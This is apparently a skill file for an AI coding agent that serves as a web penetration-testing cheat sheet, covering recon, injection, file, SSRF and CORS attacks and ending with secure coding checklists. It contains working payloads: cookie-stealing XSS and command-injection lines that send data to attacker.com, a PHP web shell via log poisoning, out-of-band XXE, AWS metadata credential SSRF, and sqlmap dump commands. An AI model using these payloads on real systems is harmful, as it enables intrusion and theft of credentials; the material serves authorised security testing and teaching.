# Web Security Skill

A comprehensive web security skill for OpenCode. Covers vulnerability detection, exploitation techniques, secure coding patterns, and security testing methodologies.

## When to Use

Trigger keywords: `web security`, `web vuln`, `XSS`, `SQL injection`, `CSRF`, `SSRF`, `IDOR`, `file upload`, `directory traversal`, `LFI`, `RFI`, `XXE`, `SSTI`, `RCE`, `auth bypass`, `JWT`, `CORS`, `CSP`, `security headers`, `secure coding`, `threat model`, `OWASP`

---

## 1. Information Gathering (Recon)

### Passive Recon
- Check `robots.txt`, `sitemap.xml`, `.well-known/`
- Wayback Machine: `https://web.archive.org/web/*/target.com`
- Certificate transparency: `crt.sh`
- Google dorks: `site:target.com`, `inurl:admin`, `filetype:pdf`
- Shodan/Censys for exposed services

### Active Recon
- Technology fingerprinting: `whatweb`, `wappalyzer`
- Subdomain enumeration: `subfinder`, `amass`, `gobuster dns`
- Directory brute force: `gobuster dir`, `ffuf`, `dirsearch`
- Parameter discovery: `arjun`, `paramspider`
- API endpoint discovery: look for `.js.map` files, `swagger.json`

---

## 2. Authentication & Authorization

### Common Auth Issues

**Broken Authentication**
- Weak password policies
- No rate limiting on login attempts
- Session fixation
- JWT misconfigurations (`alg: none`, weak secret, no expiration)
- OAuth misconfigurations (open redirect, CSRF in state param)

**Authorization Bypass**
```http
# IDOR - change resource ID
GET /api/users/1234/profile HTTP/1.1
# Try: /api/users/1235/profile

# Missing access control on API
GET /api/admin/users HTTP/1.1  # without admin token

# Parameter pollution for role bypass
POST /api/update-profile HTTP/1.1
{"username":"attacker","role":"user"}
# Try adding: {"username":"attacker","role":"user","role":"admin"}
```

**JWT Testing**
```bash
# Decode JWT
echo "eyJhbG..." | cut -d. -f2 | base64 -d

# Test alg:none
jwt_tool <token> -X a

# Crack weak secret
jwt_tool <token> -C -d rockyou.txt

# Test key confusion (RS256 -> HS256)
jwt_forgery.py --token <token> --pubkey public.pem
```

---

## 3. Injection Attacks

### SQL Injection (SQLi)

**Detection**
```http
# Basic tests
GET /product?id=1' HTTP/1.1
GET /product?id=1" HTTP/1.1
GET /product?id=1' OR '1'='1 HTTP/1.1
GET /product?id=1' OR 1=1-- HTTP/1.1

# Time-based blind
GET /product?id=1' AND SLEEP(5)-- HTTP/1.1  # MySQL
GET /product?id=1'; WAITFOR DELAY '0:0:5'-- HTTP/1.1  # MSSQL
GET /product?id=1' AND pg_sleep(5)-- HTTP/1.1  # PostgreSQL
```

**Exploitation**
```bash
# sqlmap
sqlmap -u "https://target.com/product?id=1" --dbs
sqlmap -u "https://target.com/product?id=1" -D dbname --tables
sqlmap -u "https://target.com/product?id=1" -D dbname -T users --dump

# Manual UNION
' UNION SELECT 1,2,3,4,5--  # Find column count
' UNION SELECT 1,@@version,3,4,5--  # Version
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--  # Tables
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--  # Columns
```

### Cross-Site Scripting (XSS)

**Reflected XSS**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
'-alert(1)-'
```

**Stored XSS**
```html
<!-- Test in comment/input fields -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="new Image().src='https://attacker.com/?c='+btoa(document.cookie)">
```

**DOM XSS**
```javascript
// Check for sinks: eval(), innerHTML, document.write(), location
// Sources: location.hash, location.search, document.referrer
```

### SSTI (Server-Side Template Injection)

```python
# Jinja2
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP)
{{7*'7'}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Velocity/FreeMarker
${7*7}
#set($cmd="id")
${runtime.exec($cmd)}
```

### Command Injection

```bash
# Basic tests
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 $(id)
127.0.0.1 `id`

# Blind command injection
127.0.0.1; sleep 5
127.0.0.1; ping -c 5 attacker.com
127.0.0.1; wget http://attacker.com/$(whoami)
```

---

## 4. File-Based Attacks

### LFI / Path Traversal

```http
# Path traversal
GET /file?name=../../../etc/passwd HTTP/1.1

# LFI to RCE via log poisoning
GET /file?name=../../../var/log/apache2/access.log HTTP/1.1
# First: send malicious User-Agent: <?php system($_GET['cmd']); ?>
# Then: /file?name=../../../var/log/apache2/access.log&cmd=id

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php  # Read source
php://filter/read=convert.base64-encode/resource=index.php
php://input  # POST PHP code
data://text/plain,<?php system('id'); ?>
expect://id
```

### File Upload Bypass

```bash
# Extension bypass
shell.php -> shell.php.jpg -> shell.php%00.jpg -> shell.pHp -> shell.phtml

# Content-Type bypass
# Change: Content-Type: image/jpeg

# Magic bytes bypass
# Add GIF89a; or PNG header at start of PHP file

# .htaccess upload
# Upload .htaccess: AddType application/x-httpd-php .jpg
# Then upload shell.jpg with PHP code

# Zip slip - path traversal in zip
# Create zip with ../../../shell.php
```

### XXE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>

<!-- Blind XXE / OOB -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
```

---

## 5. CSRF & SSRF

### CSRF (Cross-Site Request Forgery)

```html
<!-- CSRF PoC -->
<html>
  <body>
    <form action="https://target.com/api/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="submit" value="Submit">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

**Bypass Techniques**
- Delete CSRF token or send empty value
- Use another user's CSRF token
- Change request method: POST -> GET
- Remove referrer header
- Clickjacking: combine with CSRF

### SSRF (Server-Side Request Forgery)

```http
# Common parameters
?url=http://169.254.169.254/latest/meta-data/
?path=http://127.0.0.1:8080/admin
?redirect=http://internal-service/
?proxy=http://metadata.google.internal/

# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Bypass filters
http://127.1  # shorthand
http://2130706433  # decimal IP
http://0x7f000001  # hex IP
http://[::1]:80  # IPv6
http://spoofed.burpcollaborator.net@127.0.0.1
```

---

## 6. CORS & Security Headers

### CORS Misconfigurations

```http
# Test with Origin header
GET /api/data HTTP/1.1
Origin: https://attacker.com

# Vulnerable response
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

# Null origin bypass
Origin: null

# Subdomain takeover
Origin: https://attacker.target.com
```

### Security Headers Checklist

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 0
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=()
```

---

## 7. API Security Testing

### Common API Issues
- BOLA (Broken Object Level Authorization) / IDOR
- BFLA (Broken Function Level Authorization)
- Excessive data exposure
- Mass assignment
- Rate limiting missing
- GraphQL introspection enabled
- REST API without auth on DELETE/PUT

### GraphQL Testing
```graphql
# Introspection
{ __schema { types { name fields { name } } } }

# Query depth attack
query { a:users { b:posts { c:comments { d:likes { name } } } } }

# Batching / brute force
[{"query":"..."},{"query":"..."},...]
```

---

## 8. Business Logic Flaws

- Coupon code manipulation (negative values, reuse)
- Race conditions (double spending, parallel requests)
- Price manipulation (change price in request)
- Quantity manipulation (negative quantity)
- 2FA bypass (skip step, direct URL access)
- Password reset poisoning (Host header injection)
- Invite code reuse / enumeration

---

## 9. Testing Methodology

### Step-by-Step
1. **Map the application**: Crawl, find all endpoints, APIs, parameters
2. **Understand the technology**: Frameworks, languages, versions
3. **Test authentication**: Registration, login, logout, password reset, 2FA
4. **Test authorization**: Role-based access, IDOR, privilege escalation
5. **Test input validation**: XSS, SQLi, command injection, SSTI, XXE
6. **Test file handling**: Upload, download, path traversal, LFI
7. **Test session management**: Tokens, cookies, JWT
8. **Test business logic**: Flows, race conditions, integrity checks
9. **Test APIs**: REST, GraphQL, SOAP endpoints
10. **Check configurations**: CORS, CSP, security headers, SSL/TLS

### Essential Tools
| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy, scanner |
| sqlmap | Automated SQLi |
| ffuf / gobuster | Directory/parameter fuzzing |
| nuclei | Template-based scanning |
| jwt_tool | JWT analysis |
| commix | Command injection |
| xsser | XSS testing |
| testssl.sh | SSL/TLS testing |

---

## 10. Secure Coding Patterns

### Input Validation
```python
# Whitelist, not blacklist
import re
if not re.match(r'^[a-zA-Z0-9_]+$', user_input):
    raise ValueError("Invalid input")

# Use parameterized queries
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# Escape output context
from markupsafe import escape
safe_output = escape(user_input)
```

### Output Encoding by Context
| Context | Encoding |
|---------|----------|
| HTML body | `&lt;` `&gt;` `&amp;` |
| HTML attribute | Hex encoding `&#xHH;` |
| JavaScript | `\xHH` or `\uHHHH` |
| CSS | `\HH ` |
| URL | `%HH` |

### Checklist Before Deploying
- [ ] All inputs validated server-side
- [ ] SQL queries use parameterized statements
- [ ] Output is context-encoded
- [ ] CSRF tokens on state-changing requests
- [ ] Security headers configured
- [ ] File uploads validated (type, size, content)
- [ ] Rate limiting on auth endpoints
- [ ] Passwords hashed with bcrypt/argon2
- [ ] HTTPS enforced
- [ ] No secrets in client-side code
- [ ] Dependencies updated (`npm audit`, `pip audit`)

---

## Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.wiki/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
